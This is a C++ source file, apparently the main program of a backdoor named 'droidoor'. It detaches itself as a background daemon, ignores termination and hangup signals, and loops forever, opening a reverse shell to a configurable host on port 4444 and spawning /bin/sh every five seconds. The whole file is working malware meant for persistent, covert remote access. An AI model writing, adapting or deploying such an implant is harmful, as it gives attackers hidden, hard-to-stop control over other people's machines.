#ifndef TARGET_IP
    #define TARGET_IP "127.0.0.1"
#endif

#ifndef TARGET_PORT
    #define TARGET_PORT 4444
#endif

#include "src/droidoor/rshell.hpp"
#include <string>
#include <cstdint>
#include <iostream>
#include <unistd.h>
#include <csignal>
#include <sys/stat.h>

void daemonize() {
    if (fork() > 0) exit(0);
    setsid();
    if (fork() > 0) exit(0);
    chdir("/");
    umask(0);

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}

int main(){
    daemonize();

    // Ignore signals
    signal(SIGPIPE, SIG_IGN);
    signal(SIGHUP, SIG_IGN);  
    signal(SIGTERM, SIG_IGN);
    
    std::string ip = TARGET_IP;
    uint16_t port = TARGET_PORT;
    
    while (true) {
        {
            try {
            droidoor::ReverseShell rshell(ip, port);
                rshell.setup_connect();
                rshell.spawn_shell(std::string("/bin/sh"));

            } catch (const std::exception& e){
                std::cerr << "Failed to commit: " << e.what() << std::endl;
            }
        }

        sleep(5);

    }
    return 0;
}